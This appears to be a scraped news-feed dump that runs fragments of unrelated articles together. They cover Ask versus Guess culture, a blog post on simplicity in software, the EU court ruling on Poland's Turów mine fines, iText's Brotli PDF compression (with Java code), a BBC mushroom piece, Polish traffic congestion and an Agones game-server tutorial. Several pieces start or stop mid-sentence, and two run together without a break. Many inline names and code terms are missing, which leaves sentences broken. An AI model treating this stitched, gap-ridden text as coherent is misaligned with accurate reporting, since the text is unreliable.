International Tensions  In his column for The Guardian, Burkeman notes that neither type's approach is wrong per se, "but when an Asker meets a Guesser, unpleasantness results. An Asker won't think it's rude to request two weeks in your spare room, but a Guess culture person will hear it as presumptuous and resent the agony involved in saying no. Your boss, asking for a project to be finished early, may be an overdemanding boor – or just an Asker, who's assuming you might decline. If you're a Guesser, you'll hear it as an expectation. This is a spectrum, not a dichotomy, and it explains cross-cultural awkwardnesses, too: Brits and Americans get discombobulated doing business in Japan, because it's a Guess culture, yet experience Russians as rude, because they're diehard Askers."We Ask Strangers and Close Friends  Libertarian blogger Julian Sanchez offers a sociological reading of Donderi's theory that's worth perusing in full. "The polite indirection of 'Guess Culture' is... often a way of preserving a deliberate ambiguity, which we generally want to do in social relationships where there's an intermediate level of intimacy—whereas relationships at the poles, with either close friends or strangers, tend to be governed by more direct asks," Sanchez writes. "We do this, I think, precisely because those intermediate relationships ambiguous: We’re indirect because we’re negotiating just where on the gradient we fall ... To ask too directly at that stage can seem rude because it effectively demands a binary verdict on a work in progress."Actually, One of Them Wrong  The New Republic's Jonathan Chait takes a hard line. "This is actually pretty simple: Guessers are wrong, and Askers are right. Asking is how you actually determine what the Asker wants and the giver is willing to receive. Guessing culture is a recipe for frustration. What's more, Guessers, who are usually trying to be nice and are holding themselves to a higher level of politeness, ruin things for the rest of us ... Guessers are what forces people with poor social discernment, like me, to regard all kinds of interactions as a minefield of awkwardness."It's Not So Black and White  The Incidental Economist's Austin Frakt endorses a more situationally fluid approach. "The problem with assuming one way is better than another is that it ignores the obvious temporal heterogeneity in preferences. The 'requester' (whether of Asker or Guesser type) is in more in need of a 'yes' (or 'no') response from the 'requestee' (again, of either type) at some times than others. Likewise, a requestee is more likely to say 'yes' (or 'no') at some times than at others ... Therefore, it is perfectly sensible to be an Asker for some things at some times and a Guesser for other things (or even the same things) at another."What say you--does the Asker/Guesser model ring true?

At the time, Evernote was the tool everyone was talking about, so choosing it seemed like the right and easy decision.After storing around 500 notes for eight years, Evernote became a mess to use.
It was bloated, heavily monetized, and slow to work with. So I wanted to switch.About that time came Notion. Everyone was talking about it. I jumped on the bandwagon and migrated a few hundred of
my notes to it that were still relevant. It did not even occur to me that switching from a bloated and slow app to
a web app would result in a similar outcome later. I followed a popular choice again.After struggling for a year, I switched to Markdown notes and a plugin for an editor that renders inline images.
I'm still using this to this day. It is simple, and I will be able to open my notes 10-20 years later.
I can edit them in any editor. It works offline and does not depend on commercial products.
I encrypt my notes locally so they can be stored safely on any cloud service.I don't even use images anymore, so this could be simple plain-text files.
Why did no one tell me that I can start simple and switch to a complex system if I really need it?It took me almost ten years to understand that, don't be like me!This process never stops. There are now Roam Research and Obsidian, where people spend more time organizing
notes than writing them. Some people become obsessed with documenting everything and never reading it anymore, just
because everyone talks how cool it is.Remember the peak of popularity of microservices and the use of GraphQL?
Small teams of 3-5 developers used them to build simple web apps
just because it was cool and big tech was writing about it a lot.Simple systems became more complex for no benefit. A complex working system should only grow from a simple one.
You need to gather initial knowledge and requirements about your project first. Iterating a simple system is much
faster and easier. When a project starts, things change a lot. It's common to rewrite the whole project from scratch 2-3
times in startups just because the initial prototype resulted in so much technical debt and bad decisions. I had experienced this
multiple times at my jobs. Not every system should be complex in the first place.If you can only start with a complex system, there is a high chance it's broken by design.The list of complex technologies is very big and I can go on and on.
Oftentimes, you don't need to use ten cloud services, hundreds of serverless functions and so on.
Not only can it be simpler, but it can also be faster and cheaper too!
You just need to ask yourself why you need a particular technology in this
project first. Sometimes the hardest part is to convince the management, though.In blogging circles, one of the popular topics is "I migrated my blog from X to Y". Some people change
their blog engines 3-4 times and I'm not an exception.I started with WordPress, then I migrated to Django, and right now my blog is completely static.When I was using Django, I needed a good server with proper caching so that when traffic spikes, it can handle it.Right now, I don't need a database. Hosting static HTML files is simple, and you can do it for free.
The only dynamic part is  comments. I'm using CloudFlare workers with a simple 50-line script that just
stores comments in Cloudflare Workers KV.They are not loaded dynamically. I just import them to markdown
files and regenerate the blog. There is no database to serve them. They are preserved in markdown forever.The whole blog engine is 800 lines of Python code that supports comments, RSS, categories, and so on.
I know exactly how it works, and adding new features is super easy. There is also nothing to hack.
Internally, static website generators are pretty complex to handle various use cases.
But, if I were using a popular static generator, adding custom features would be still hard.A lot of companies are trying to force AI everywhere. Look at Microsoft, they added it everywhere.
In most cases, it does not make the life of a user easier. In the case of Microsoft, it actually results in more bugs
and the worst UI. This time, ignoring complexity is much harder for a user, so the best shot is to switch to Linux where you have full control.I think about this a lot. It's easy to spot problems in other products, but the product that you are working on
can suffer from the same problems. It's harder to notice, especially when you don't use it.Another problem with LLMs is that it is much easier to add new features to your project now.
If you use LLMs, keep things simple and the scope of changes limited.
When you aim for big changes, the code quality drops significantly.
You stop paying attention to the changes to the point that you stop understanding how things work.There is an old tale regarding code reviews. A team lead reviewed 100 lines of code and found three bugs.
After that, he reviewed 1500 lines PR and found zero bugs. This happened because the scope of the changes was so big,
that his brain just refused to concentrate on every change.The quality of LLM output depends on code size, too.
Their context is limited, and the bigger and more complex the codebase, the worse they perform.]]></content:encoded></item><item><title>EU court rejects Poland’s appeal against €68.5 million coal mine fines</title><link>https://notesfrompoland.com/2026/01/22/eu-court-rejects-polands-appeal-against-e68-5-million-coal-mine-fines-2/</link><author>Daniel Tilles</author><category>news</category><pubDate>Thu, 22 Jan 2026 11:28:30 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.The European Court of Justice (ECJ) has rejected a final appeal by Poland against the €68.5 million in fines it was forced to pay by the European Union for failing to suspend activity at the Turów coal mine during an environmental dispute with the Czech Republic.The ruling now brings the long-running case to a close.The dispute dates back to 2021, when Prague filed a complaint to the Court of Justice of the European Union (CJEU) over Poland’s expansion of operations at Turów, an open-cast mine near the Czech border. It argued that Poland had acted in violation of EU law and its actions would cause environmental damage.As an interim measure, the CJEU ordered the mine to suspend operations for the duration of the court proceedings. Poland refused to comply, arguing that the continued operation of the mine and the nearby power plant that it supplies, which produced 7% of Poland’s electricity, was crucial for energy security.As a result, the CJEU in September 2021 ordered Poland to begin paying daily fines of €500,000 until it complied. Poland then refused to pay those fines, leading the European Commission to deduct the money, €68.5 million in total, from Poland’s EU funds.In 2022, after it had reached an agreement with the Czech Republic to end the dispute over the mine, Poland launched a complaint to the CJEU against the European Commission’s actions.It argued that the agreement with Prague meant the fines could be cancelled retroactively and that the commission’s decision to deduct the money was therefore unlawful. The fines had been issued before the agreement with Prague, but the commission took the money after the agreement had been reached.In 2024, one part of the CJEU, known as the General Court, rejected Poland’s complaint. It found that the removal of the case from the court’s register following the settlement with the Czech Republic did not relieve Poland of the obligation to settle the fines already accrued.Although the case had originally been brought by Poland’s former national-conservative Law and Justice (PiS) government, which ruled until December 2023 and regularly clashed with Brussels, its current more pro-EU government, led by Prime Minister Donald Tusk, still decided to appeal the ruling.That appeal was heard by the European Court of Justice, which is the second part of the CJEU. In a ruling issued on Thursday, the ECJ rejected Poland’s appeal.“The obligation to pay the daily penalty…is intended to ensure compliance with the interim measures already ordered, to preserve the full effectiveness of the future final decision, and thus to guarantee the effective application of EU law in the general interest,” wrote the court.“The actions of the parties to the dispute, including the conclusion of a settlement agreement, cannot have the effect of retroactively varying, annulling or setting aside an order imposing such a periodic penalty payment,” it added.At the time of writing, Poland’s government had not yet commented on the ruling. However, Anna Zalewska, a former PiS government minister and now member of the European Parliament, used it as an opportunity to criticise European Commission President Ursula von der Leyen.“

Meanwhile, the web moved on. In 2015, Google introduced Brotli, a compression algorithm so efficient it now powers 95% of internet traffic. Websites got faster. Downloads got smaller. CDNs got cheaper.Now PDFs are getting the same upgrade.The PDF Association is bringing this battle-tested web compression technology into the PDF specification itself. After a decade of Brotli proving its worth across billions of web requests daily, it's now getting ready to make it's introduction into ISO 32000.With iText, we can help drive widespread adoption with a production-ready Brotli encoder and decoder for the PDF ecosystem. The result?  with zero quality loss, using the same algorithm trusted by Google, Cloudflare, and every major CDN.PDF compression has been stuck in 1996 for a good reason: backward compatibility is sacred. The PDF Association operates under a strict principle—any new feature must work seamlessly with existing readers, or it risks fragmenting the ecosystem. Adding a new compression algorithm isn't just a technical change; it's a  that could render documents unreadable in older software. This creates a high barrier for innovation.Beyond compatibility concerns, there are other practical challenges. The PDF specification moves slowly by design—it's an ISO standard that requires consensus by hundreds of stakeholders. Compression algorithms must be  (ruling out patented options),  across platforms, and  in production.Finally, the ecosystem is conservative: enterprises and governments rely on PDFs for archival and legal documents that must remain accessible for decades, making any breaking change a risk that needs extraordinary justification.Encoding and decoding: Technical implementationTo get Brotli compression working within the iText SDK, we need to solve two problems: reading documents, and also writing them.Let's start with the easiest one; reading documents.Decoding: Advanced plumbing workFirst of all, let's look at how the content of a page is stored within a PDF. We can demonstrate this with just the classic "Hello World" text example.The following PDF syntax simply displays the text "Hello World!" on a page:5 0 obj                 % Unique identifier to reference this content from other places within the PDF
<</Length 49>>stream    % Meta data for the stream object. Here it contains a Length value to indicate how many bytes are there after the `stream` keyword.
q                       % the actual content
BT
/F1 12 Tf
37 788.33 Td
(Hello World!)Tj
ET
Q
endstream               % Indicates the end of the stream object
endobj                  % Indicates the end of the referenceable object
So, if we need to render or do anything else with the content, it would look like the following:|------------------------|
| Get stream based on id |
|------------------------|
           ||
           \/
|------------------------|
|      Read content      |
|------------------------|
           ||
           \/
|------------------------|
|    Render/Do stuff     |
|    with the content    |
|------------------------|
Okay, so now we have a high-level view how PDF processors handle the low-level processing of those stream objects, we can dive a little deeper!Let's take a look at the following PDF stream object where the content is encoded using the Deflate algorithm.5 0 obj
<</Filter/FlateDecode/Length 36>>stream                  % The meta data now now includes `Filter`
xœmÍÂ0„ïûëM/1?Æl®‚âUømI)Íûºm¢...            % Reduced for clarity
endstream
endobj
First of all, we notice there is an additional Key  with a value of  in the metadata.
This can be interpreted the following way: "The content of this stream object is only usable after its  filter is applied".So how does this change our working implementation?|------------------------|
| Get stream based on id |
|------------------------|
           ||
           \/
|------------------------|
|      Read content      |
|------------------------|
           ||
           \/
|------------------------|
|         Decode         |
|     based on Filter    |
|------------------------|
           ||
           \/
|------------------------|
|    Render/Do stuff     |
|    with the content    |
|------------------------|
We can now see we require an operation on the content before it's usable. The PDF specification already provides a variety of ways to write the content of the PDF streams.Decodes ASCII hexadecimal data to binary.Decodes ASCII base-85 data to binary.Decompresses data using LZW compression.Decompresses data using zlib/deflate compression.Decompresses data using run-length encoding.Decompresses CCITT fax-encoded monochrome images.Decompresses JBIG2-encoded monochrome image data.Decompresses JPEG DCT-based image data.Decompresses JPEG 2000 wavelet-based image data.Decrypts data encrypted by a security handler.So the idea for Brotli is to simply add another  implementation.What we need to get it working into iText is actually pretty minimal:Get the decoding implementation from Google's repository.Write some plumbing code to call it from iTextHook up the plumbing code to the  filterFor the first step we simply embedded Google's reference Java Brotli decoder straight from their official repository into our kernel module.By embedding Google's reference implementation directly, we guarantee:: No version conflicts with other libraries: Same decoder on all platforms: We control the code, even if upstream changesAutomatically generate C# version: Using our porting mechanism we can have a C# implementationThe plumbing implementation lives in , which plugs into iText's existing filter pipeline:public class BrotliFilter extends MemoryLimitsAwareFilter {
    @Override
    public byte[] decode(byte[] b, PdfName filterName, PdfObject decodeParams,
            PdfDictionary streamDictionary) {
        try {
            final byte[] buffer = new byte[DEFAULT_BUFFER_SIZE];
            final ByteArrayInputStream input = new ByteArrayInputStream(b);
            final ByteArrayOutputStream output = enableMemoryLimitsAwareHandler(streamDictionary);
            final BrotliInputStream brotliInput = new BrotliInputStream(input);
            int len;
            while ((len = brotliInput.read(buffer, 0, buffer.length)) > 0) {
                output.write(buffer, 0, len);
            }
            brotliInput.close();
            return output.toByteArray();
        } catch (IOException e) {
            throw new PdfException(KernelExceptionMessageConstant.FAILED_TO_DECODE_BROTLI_STREAM, e);
        }
    }
}
Let's break down what's happening in this implementation:: The filter extends , which protects against decompression
bombs—malicious PDFs that expand into gigabytes of data when decompressed. This is critical for production systems.: The compressed bytes  are wrapped in a , which is then passed to
Google's . This is where the magic happens— handles all the heavy lifting of Brotli decompression.As you can see, writing the plumbing code is pretty easy because of iText's architecture.The last thing to do is to ensure iText knows which implementation to associate with the  filter.This is also pretty trivial. The filter is registered automatically in  alongside  and the other standard PDF
filters:public final class FilterHandlers {
    private static final Map<PdfName, IFilterHandler> defaults;

    static {
        Map<PdfName, IFilterHandler> map = new HashMap<>();

        map.put(PdfName.FlateDecode, new FlateDecodeFilter());
        map.put(PdfName.Fl, new FlateDecodeFilter());
        //other implementations removed for clarity

        // we add our implementation
        map.put(PdfName.BrotliDecode, new BrotliFilter());

        defaults = Collections.unmodifiableMap(map);
    }
}
That's it. From this point on, any PDF with  streams just works. No configuration needed.Now we could have stopped here—our SDK could process Brotli-compressed PDFs from other sources. But reading isn't enough. To truly bring Brotli to the PDF ecosystem, we needed to let developers create these smaller files. That meant solving the encoding problem.And encoding turned out to be significantly more complex than decoding.Encoding: a separate module for compressionThe problem: iText’s compression was hardcodedBefore Brotli, iText only supported two compression modes for PDF streams:This logic was baked directly into the stream-writing code—there was no abstraction, no plugin point. If you wanted to use a different compression algorithm, you were out of luck.To support Brotli (and future algorithms), we needed to introduce a new abstraction layer: IStreamCompressionStrategy.public interface IStreamCompressionStrategy {
   /**
    * Gets the PDF filter name that identifies this compression algorithm.
    *

This interface decouples compression logic from iText's core PDF writing machinery. Now, instead of hardcoding Flate everywhere, we can inject different strategies at runtime. To inject the required strategy we make use of the . You can find more information about it here: Adding Dependency Injection to the PdfDocument class.From now on when iText needs to compress a stream, it asks the  in the : "Do you have an IStreamCompressionStrategy?": Use the registered strategy (Brotli in this case): Fall back to the default Flate compression: iText Core no longer cares about the algorithm used: You only pay the cost if you use it: New algorithms just implement the interfaceThe Second Problem: No Pure Java EncoderHere's where things got tricky. While Google's Brotli decoder has a pure Java implementation (which we embedded for reading), the official Brotli . To use it from Java, you need: to call native code from JavaPlatform-specific native libraries ( for Windows,  for Linux,  for macOS) to compile and ship these libraries for every platformFor a heavily-used library like iText, shipping native binaries is a non-starter:: Users need to manage native libraries across platforms: Native code introduces attack surfaces: We'd need to compile for Windows x64, Linux ARM, macOS Silicon, etc.: What if another library ships a different Brotli version?We needed a solution that handled this complexity  iText's core.That solution is a separate Maven module () that you add as an optional dependency. This
module contains:BrotliStreamCompressionStrategy: Implementation of IStreamCompressionStrategy: A third-party library that wraps Google's C++ encoder with JNIHere's what BrotliStreamCompressionStrategy looks like:public class BrotliStreamCompressionStrategy implements IStreamCompressionStrategy {

    @Override
    public OutputStream createNewOutputStream(OutputStream original, PdfStream stream) {
        int compressionLevel = convertCompressionLevel(stream.getCompressionLevel());
        Encoder.Parameters params = Encoder.Parameters.create(compressionLevel);
        try {
            return new BrotliOutputStream(original, params);
        } catch (IOException e) {
            throw new PdfException(KernelExceptionMessageConstant.CANNOT_WRITE_TO_PDF_STREAM, e);
        }
    }

    @Override
    public PdfName getFilterName() {
        return PdfName.BrotliDecode; // This goes into the /Filter entry
    }
}
The native wrapper: brotli4jInstead of writing JNI bindings ourselves, we rely on brotli4j—a mature, well-tested library that:Wraps Google's official C++ Brotli encoder/decoderShips pre-compiled native libraries for all major platforms (Windows x64/ARM, Linux x64/ARM, macOS Intel/Silicon)Automatically extracts the correct native library at runtime (no manual setup)Is actively maintained and widely used (powers projects like Netty, OkHttp)By delegating to brotli4j, we get production-grade native bindings without maintaining our own JNI layer.Why keep encoding separate?You might ask: "Why not bundle brotli4j in the kernel module like you did with the decoder?"Great question. Here's the reasoning:Encoder (separate module)Required to read Brotli PDFsPure Java (Google's decoder)Native code (brotli4j with JNI)Every user needs to read PDFsMost users stick with FlateBy keeping the encoder separate, we give users choice: add  if you need 20% smaller files, or stick with the default if native dependencies are a concern.Putting it all together: Full exampleHere's what it looks like to create a Brotli-compressed PDF:First of all add the required dependencies. Notice you have to add iText's artifactory because of the experimental nature of the code, and so users don't accidentally enable it.<repositories>

The PDF now uses  instead of , and the file is 15-25% smaller—with  to your document-building code.The catch: Compatibility isn't universal (yet)Here's the honest truth: Brotli-compressed PDFs won't open in Adobe Acrobat Reader today. They won't render in your browser's built-in PDF viewer. Most third-party PDF libraries will reject them outright.Why? Because  isn't part of the official PDF specification yet. The PDF Association is actively working on adding it to ISO 32000 (the PDF standard), but until that's finalized and implementations roll out, Brotli PDFs exist in a gray area.What about forward compatibility?Here's the good news: Brotli PDFs are future-proof. Once the PDF Association finalizes the spec and vendors implement it, your existing Brotli-compressed documents will just work. You're not creating broken files—you're creating files that are .Think of it like HTTP/2 in 2015. Early adopters who deployed it got immediate performance wins in their own
infrastructure, and as browsers caught up, those benefits became universal. Brotli PDFs follow the same pattern.We're not shipping this as a toy feature. We're working directly with the PDF Association to:Standardize the specification (syntax, decode parameters, dictionary support) across multiple platforms (Java, .NET, C++) to ensure interoperability when other vendors adopt it when the spec finalizes (we'll handle any breaking changes)By adopting Brotli compression now, you're not taking a risk—you're investing in a proven technology that's on a clear path to standardization.PDF compression hasn't evolved in 30 years—until now. Brotli represents the biggest leap in PDF storage efficiency since the format was invented, and iText is bringing it to production .Yes, there are compatibility limitations. Yes, it's experimental. But every standard starts this way. HTTP/2, WebP, and TLS 1.3 were all "experimental" once. Early adopters got the benefits first, then the ecosystem caught up.By using iText's Brotli implementation now, you're: by 15-25% immediatelyFuture-proofing your documents for inevitable standardization with real-world feedback for a more efficient PDF ecosystemThe PDF Association is listening. Adobe is watching. And iText is leading.Let's make PDFs smaller together. 🚀]]></content:encoded></item><item><title>The mushroom making people hallucinate tiny humans</title><link>https://www.bbc.com/future/article/20260121-the-mysterious-mushroom-that-makes-you-see-tiny-people</link><author>1659447091</author><category>hn</category><pubDate>Thu, 22 Jan 2026 10:30:07 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[It could also provide important clues about what causes spontaneous lilliputian hallucinations in people even when they're not consuming . The condition is rare, and as of 2021, only 226 non-mushroom-related cases had been reported since lilliputian hallucinations were first described in 1909. But for those relatively few people, the outcome can be serious: a third of those patients who came down with non-mushroom-related cases did not fully recover.Studying  could help scientists better understand the brain mechanisms behind these naturally occurring lilliputian visions, maybe even leading to new treatments for people who develop the neurological condition, Domnauer says."Now we may understand where in the brain [liliputian hallucinations] originate," says Dennis McKenna, an ethnopharmacologist and director of the McKenna Academy of Natural Philosophy, a non-profit education center in California, US. He agrees that understanding the mushroom's compounds could lead to new drug discoveries. "Is there a therapeutic application? It remains to be seen," says McKenna. Researchers estimate that less than 5% of the world's fungal species have been described, so the findings also highlight the "enormous potential" for discovery in the world's ever-dwindling ecosystems, says Furci, whose work focuses on exploring the fungal kingdom. "Fungi hold a very large biochemical and pharmacological library that we're only just beginning to tap into," says Furci.

We cannot do what we do without your support.Łódź in Poland has been ranked as the world’s fourth most congested city in the annual Traffic Index produced by navigation-device maker TomTom. Another Polish city, Lublin, was sixth.The ranking is compiled using anonymous GPS data from cities around the world, showing the movement (or lack of movement) of vehicles. The firm then calculates a “congestion level” that shows how much slower traffic moves compared to when roads are free.Łódź, which is Poland’s fourth largest city with a population of around 650,000, had the world’s fourth-worst average congestion figure of 72.8%, meaning journey times are that much slower than when traffic is free flowing.Only Mexico City (75.9%), Bengaluru (74.4%) in India and the Irish capital of Dublin (72.9%) had worse congestion. Łódź was followed by Pune (71.1%), also in India, and then, in sixth place, came Lublin (70.4%), a city of 330,000 people in eastern Poland.Among European cities, Łódź and Lublin were the second and third most congested, while Poznań (64.9%), Poland’s fifth-largest city, followed in fourth (though it was 14th in the global ranking).Other Polish cities to be ranked among the top 100 globally were Wrocław (27th, 59.2%), Bydgoszcz (28th, 59%), Kraków (31st, 58.7%), Warsaw (77th, 51.3%), Gdańsk (87th, 50.1%) and Szczecin (94th, 49.5%).TomTom’s data show that congestion in all of those Polish cities worsened in 2025 compared to 2024. In Łódź, an average commuter loses 135 hours to rush hour traffic a year, while in Lublin the figure is 117 hours.Łódź has consistently ranked near the top of TomTom’s Traffic Index in recent years, with local media ascribing some of the blame to constant major roadworks in the city centre.“I know we didn’t do very well in this ranking,” deputy mayor “I believe this year will be better [because] the [construction] work is better distributed across Łódź,” he added. In fact, the new TomTom ranking shows that congestion increased by 1.1 percentage points in 2025 and Łódź rose from seventh to fourth place.

If you’ve never heard about it, Agones is a project created by Google to manage and deploy video game servers on Kubernetes.Recently, I dipped my toes in the water and tried it out. I had a lot of fun doing so and I want to share everything I learned. In this article, we will go over the following:The creation of a basic .Integrating it with .Its deployment on .The making of a matchmaking service in Go.Setting up and benchmarking  for our infrastructure based on the matchmaking’s player queue.I’ll share a lot of relevant code snippets and diagrams, but if you want to get the full picture, you can find the source code and the Kubernetes manifests in this GitHub repository:Before going any further, we need to address a question regarding Agones:  That was my first reaction upon discovering Agones because, in theory, anyone can just deploy their game server as a regular deployment on a cluster, right? Well, things are actually a bit more complicated than that.If you look into the Agones documentation, you will find this section which basically answers the question. To put it simply, game server workloads are both stateful and stateless. An empty game server is stateless and can be safely deleted or moved, while a game server with players probably has in-memory state and must not leave the node.In other words, Agones allows you to manage and scale game server workloads based not only on CPU, memory, or traffic but also on . Thanks to that, you can update game servers without shutting down servers with active players, reuse a game server on which a game has ended or even set autoscaling based on the number of full game servers. And much more.Developing a game server in GoTo start, we obviously need a game to work with. For this purpose, I will be making a quick and simple game of  in Go.Since this is just a simple demo, I won’t be trying to make something grandiose. It will just be a basic HTTP server with a WebSocket on which two players will connect to battle. For a real game, you would probably want to use UDP connections.Both players will be connected to the WebSocket and will have to select their move. The connection stays open for both players until they both selected a move. Once both players chose their moves, the server sends the winner to them.To do this, I used standard Go packages such as  and github.com/gorilla/websocket.The root path () serves the index.html file (which is embedded in the binary) and the  path serves the WebSocket connection.The index.html is just a very basic web page with buttons for each move (rock, paper, scissors). It uses JavaScript to send a message to the WebSocket when a button is clicked. Results are displayed in the  div.I won’t go too much into details about the game logic since, well, it’s just a simple game of rock paper scissors.The game loop is fully coded in the WebSocket handler, and it uses methods from the  package located in . Here’s a basic overview of what this handler does:If you try to make something similar, keep in mind that you have to handle what happens when a player disconnects or leaves the game. In this case, I just made it so the player gets deleted from the game allowing them or someone else to rejoin. You may want to just end the game or kick everyone else if one of the players disappears.In order to manage concurrency, I use a simple  to ensure that the player list and moves are not modified at the same time. Before every operation, I lock the mutex and unlock it after the operation is complete. For example:Upon game end, the WebSocket connections are closed and the game server shuts down.The end result looks like this:Very impressive, isn’t it? Jokes aside, this simple multiplayer game will be more than enough for us to get started with Agones.Adding Agones to a game serverNow that we have a game server ready, we need to make some tweaks in order to deploy it with Agones. If you try to deploy it as of right now, it will just crash as Agones expects your container to send regular ping.To explain briefly how things work in Agones, when deploying a game server, we use the well named  resource. You can think of GameServers as the equivalent of Pods in the Agones world. They are what will be running your game server container.The main difference with regular Pods is that GameServers run your image alongside an  which is responsible for managing the lifecycle of the game server. This sidecar is responsible for ensuring that the game server is healthy and available for players. It communicates with the Kubernetes API to update the GameServer resource status.---

        end
    end

    AgonesSidecar -->|HTTP PATCH GameServer resource| KubeAPI
The bare minimum to get your game server up and running with Agones is to implement a . To do this, we first need to import the Agones Game Server Client SDK. In my case, I will be importing the Go package but there are also SDKs for other languages such as Java or C++ and also for game engines such as Unity or Unreal Engine.Even if your language or game engine doesn’t have an SDK, you can still use Agones by making and deploying a sidecar container alongside your game server. This sidecar container would be responsible for communicating with Agones and you would just need to communicate with your game binary. Or else, you can just communicate directly with Agones using the gRPC API or the HTTP API which should be supported by most languages.Once we have our SDK installed, we need to actually implement the health check. This is usually done by creating a loop that sends a ping to Agones every few seconds. Here’s how you can do it in Go:Now, we can technically already deploy our game server on a Kubernetes cluster with Agones by creating a  with our game container image. However, we are far from production-ready. We still need to at least implement the following Agones functions: - To indicate that the game server is ready to accept connections from players. - To tell Agones to shut down the game server.Implementing the  function is pretty straightforward. We just need to call it from the SDK when starting the game server:For the  function, things are a bit more complicated. What we want to do is to implement a graceful shutdown process. Basically, it means that we need our server to handle signals like  by waiting for everything to complete before shutting down. It is especially important in order to avoid loss of player data or of an unsaved game for instance.Fortunately, this pattern is pretty easy to implement in Go. We will be using the context package to handle cancellation and timeouts coupled with the signal package to handle, as its name implies, signals.We are first going to need to create a context that will be used all throughout our server. In order to have it be cancellable with Unix signals, we will be creating it using  from the  package. We can then, at the end of our  function, have all of our code for shutting down our server after .Currently, we handle shutdown from signals correctly, but not necessarily gracefully. In general, when implementing this pattern, we want to ensure that all ongoing operations are completed before shutting down. In our case, this isn’t really important as the process of shutting down the client SDK and the HTTP server should be pretty straightforward.However, let’s say you’re making an actual game: you may want to save the result of your game to a database, for example. In Kubernetes, Pods getting deleted are first sent a , and have a grace period of 30 seconds. After that, Kubernetes sends a , which you want to avoid if possible. If for some reason the database you’re sending your data to is experiencing issues, you will want to rollback your transaction before being forcefully terminated.We can achieve this by having a timeout, and to do that, we’re going to make, once again, a new context, but with  this time around. This way, we will be able to pass down the context with timeout to our different shutdown functions and ensure that our game server is properly shut down in a given amount of time.In my case, I set it up with a timeout of 10 seconds. This is more than enough for the Agones client SDK and the HTTP server to shut down gracefully.With all of this, we now have the lifecycle of our game server fully implemented and ready to be deployed alongside Agones’ SDK sidecars in actual  resources.Now that we have our game server ready, we can deploy it on a Kubernetes cluster. I’m using a basic kind cluster for this example, but you can use any Kubernetes cluster you want. The only important requirement is to install Agones on your cluster. To do so, you can simply use Helm chart like so:We will be deploying our game server in the  namespace. If you want to deploy yours in a different one, you may need to change some values in your Helm deployment of Agones.Once we have our cluster ready with Agones up and running, we can start by deploying our game server image in a simple GameServer resource:You should then be able to see it by running . You should see something like this:Notice how Agones picked a random port between 7000 and 8000 for the game server. This port is exposed on the host node’s network using the hostPort field of Pods. This means that you can access the game server directly from your host machine using the IP address and port number.You can even check its events to see the different steps it went through:Which should give you something like this:You should be able to access the game directly from your web browser by visiting .Next, we can deploy the game server in a Fleet. If GameServers are the equivalent of Pods, you can think of Fleets as the equivalent of Deployments or StatefulSets. They allow us to have replicas of our GameServer and scale them up and down without killing active game servers. We can create one just like so:We can then check the GameServers it created:This fleet can easily be scaled up by running :But, right now, if you try to scale it down, it could kill active GameServers. What we want to do in order to avoid that is to use a GameServerAllocation. This type of resource allows us to set its state from  to , which will prevent Agones from deleting that GameServer. Let’s allocate a random GameServer from our fleet with :Now, let’s do something a bit extreme and scale the fleet down to 0 replicas:If you look at the list of GameServers, you’ll notice that the one we allocated is still there:This is great, as we managed to scale down without stopping a GameServer that has been marked as being allocated for a game. If you go ahead and finish playing a game on this server, you’ll notice that the GameServer gets automatically deleted.Of course, in real life, you would probably use the Kubernetes API to allocate our GameServers instead of using kubectl. This way, we can automate the allocation process without manual intervention.Making a matchmaking serviceSo far, we managed to make a game server, hook it up to Agones and deploy it on a Kubernetes cluster. All of this is great but it’s nothing we couldn’t have achieved by simply using regular Kubernetes resources such as Deployments or StatefulSets. But now that we have everything set up, we can actually go a bit further and exploit Agones’ features to have a  which will scale our game servers automatically based on demand 🚀.Or, at least, that’s what we’re going to do in the next part of this post. For now, we’ll focus on making a matchmaking service that will match 2 players together and will allocate a GameServer to them.If you look online, you might find an open-source solution for matchmaking called Open Match. It has been made by Google, and it can work with Agones, which is great. However, as of writing this, there hasn’t been any update in over 2 years. A second version of Open Match called Open Match 2 seems to be planned but there are no releases yet and only a single person seems to be working on it.Here’s what we’ll be working with:---

    end
For simplicity’s sake, I copied the base structure of the game server and reused it in the matchmaking service. This is why we are once again working with an HTTP server serving a WebSocket on . This time, we redirect the player by opening the web page the matchmaking service will return.The core component of this matchmaking system is the . As you can see on the diagram, we are working with two topics:: Player requests for a match.: Topics for the response to the player.The brain of the operation is named the , and is basically a process that will take a player from the queue and match them with another one. Once a match is made, it will reserve a GameServer by creating a  through the Kubernetes API. It then sends them both the server address they need to join via the match results topic of both player.To work with Pub/Sub in Go, we’ll be using a great library called Watermill, which will simplify the task a lot. What’s great about this library is that it works with a lot of different options, including Kafka, RabbitMQ or even PostgreSQL. To keep things simple, I chose to go with a simple Go Channel which you can also use as a Pub/Sub with Watermill.Here’s how the WebSocket handler initiates the matchmaking process and waits for a match result with Watermill:As you can see, it’s pretty straightforward with functions such as  and .That’s basically it for the “frontend” part of the matchmaking service, but there’s a second part which is called the matcher. It runs as a goroutine but it could be run as a separate service if we were to use another Pub/Sub. It’s responsible for matching two players from the  queue.To do that, I used a Router from Watermill, which gives a lot of features that are pretty nice to build event-driven systems. In our case, I’m just using it to add a handler for the  topic, which can be done just like this:Handler functions in Watermill work like you would expect, by taking a message as input to process it.What’s really important are the parts that are highlighted. You should be able to see the basic matchmaking logic which is to set a player as  if no other player is waiting. And when a second player joins, match them together and publish the result to both players.Last but not least, we have to take a look at the  function which allocates a random GameServer and returns its IP and port. To do that, I simply use the Kubernetes API to create a resource like we made earlier.However, if you try deploying the matchmaking service just like that with a Deployment, it will actually not do anything. This is because by default, we are using the  ServiceAccount to access the Kubernetes API from our Pod. To fix this, we just need to create a new  and a  that grants the necessary permission to create  resources.And then, we can use this newly created ServiceAccount in our Deployment:Now, we can just create a Service for this Deployment and access it using port-forwarding like that:If we access the matchmaking service at  and try to play a game, we get this:As you can see from the screen briefly flashing to black, the matchmaking service indeed redirects to a game server once a match is found.Something to keep in mind is that in its current state, the matchmaking is not scalable. You can’t really run multiple instances of the matchmaking as you could end up with players stuck in different matcher’s instances.However, it shouldn’t really matter as you can shard the matchmaking service by region (eu, us, etc.) or skill-level (Elo, rank). Then, you can have an instance of the matchmaking service for each shard. For example, you could have an instance running only on eu.elo100-200.matchmaking and one on us.elo100-200.matchmaking.Also, I used a WebSocket 